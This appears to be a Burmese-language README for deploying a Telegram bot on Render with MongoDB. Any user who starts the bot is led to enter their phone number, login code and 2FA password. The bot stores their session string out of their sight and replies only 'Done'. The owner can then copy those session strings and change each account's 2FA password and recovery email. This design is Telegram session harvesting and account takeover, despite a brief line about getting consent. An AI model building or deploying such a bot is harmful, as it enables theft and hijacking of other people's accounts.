1. GitHub မှာ PRIVATE repo ဆောက်ပြီး ဒီဖိုင်တွေ အကုန်တင်ပါ။
2. MongoDB Atlas (free M0 cluster) ဆောက်ပြီး connection string ယူပါ
   - Database Access > user ဆောက်ပါ
   - Network Access > 0.0.0.0/0 ခွင့်ပြုပါ (Render ကနေ ချိတ်ရန်)
   - Connection string format: mongodb+srv://user:pass@cluster.mongodb.net/
3. Render > New > Blueprint (render.yaml) သို့မဟုတ် Web Service
   Build Command: pip install -r requirements.txt
   Start Command: python main.py
4. Environment Variables: API_ID, API_HASH, BOT_TOKEN, OWNER_ID, MONGO_URI
5. ဘယ် Telegram user မဆို bot ကို /start လုပ်ပြီး
   phone -> code (space ခြား) -> (2FA ရှိရင်) password ထည့်နိုင်ပါတယ်။
   ပြီးရင် user ဆီကို session string မပြဘဲ "Done +95xxxxx" ပဲ ပြန်ပြောပါမယ်။
6. OWNER_ID နဲ့ ကိုက်တဲ့ account က /list ရိုက်ရင်
   database ထဲ သိမ်းထားတဲ့ account တွေကို inline button (ဖုန်းနံပါတ် + နာမည်)
   အနေနဲ့ ပြပါမယ်။ Button ကို နှိပ်မှ session string ကို
   copy လုပ်လို့ရတဲ့ code block အနေနဲ့ ပြပေးပါမယ်။ Owner မဟုတ်သူ button နှိပ်ရင်
   "Not authorized" ပြပါမယ်။
7. Session string တွေက password မလိုဘဲ account ဝင်ခွင့်ပေးတဲ့ key ဖြစ်လို့
   MongoDB user/password နဲ့ Render env ကို ခိုင်မာအောင်ထားပြီး
   အခြားသူနဲ့ မမျှဝေပါနဲ့။ ဒီ bot ကို တခြားသူတွေကို account ထည့်ခိုင်းမယ်ဆိုရင်
   သူတို့ account ကို ကိုယ်ဘာသာ ယူသွားတာမို့ သူတို့ရဲ့ ကြိုတင်သဘောတူညီချက် ရယူပါ။

8. Bot ကို ၂၄ နာရီ run ထားဖို့ keep_alive task ကို ၁ မိနစ်တစ်ခါ
   ကိုယ့် Render URL ကို ကိုယ်ပဲ ping လုပ်အောင် ထည့်ထားပါတယ်
   (RENDER_EXTERNAL_URL ကို Render က auto-ထည့်ပေးတာမို့ ထပ်ထည့်စရာမလိုပါ)။
   Free plan တောင် ping ဆက်ရနေသရွေ့ sleep မဝင်ပါဘူး။
   မှတ်ချက် - Render free plan မှာ လစဉ် instance hour ကန့်သတ်ချက်ရှိတာကို
   သတိရပါ (၇၅၀ hour/လ ဝန်းကျင်) - အမြဲဖွင့်ထားရင် တစ်လကုန်ရင်
   quota ကုန်နိုင်ပါတယ်။

9. Account ကြည့်တဲ့ screen မှာ "Recovery email ပြောင်းရန်" button ထပ်ထည့်ထားပါတယ်။
   - ဒီ "email" က Telegram ရဲ့ 2FA recovery email ဖြစ်ပြီး Gmail inbox ထဲ
     ဝင်တာ မဟုတ်ပါဘူး (Telegram ကနေ ပို့တဲ့ verification code ကိုပဲ
     အဲဒီ email ဆီ ပို့ပေးတာပါ)။
   - Account မှာ 2FA password မရှိသေးရင် Telegram ကိုယ်တိုင်က
     recovery email ထည့်ခွင့်မပြုပါ (feature limitation) — ဒီအခြေအနေမှာ
     bot က "2FA password မရှိလို့ email ထည့်လို့မရပါ" လို့ ပြောပေးပါမယ်။
     ဒါကြောင့် အရင်ဆုံး 2FA password ကို "2FA password ပြောင်းရန်" button
     ကနေ သတ်မှတ်ပေးရပါမယ်။
   - Email ထည့်/ပြောင်းလိုက်ရင် Telegram က verification code ကို
     အဲဒီ email ဆီ ပို့ပါမယ် — admin ဆီကို bot က code တောင်းပြီး
     admin ရိုက်ထည့်ပေးရပါမယ် (email inbox ကို ဝင်ကြည့်နိုင်မှ
     ဖြစ်နိုင်ပါတယ်)။
   - Email ပြောင်းချင်မှ ပြောင်း၊ မပြောင်းချင်ရင် /skip ရိုက်ပို့လို့ရပါတယ်။
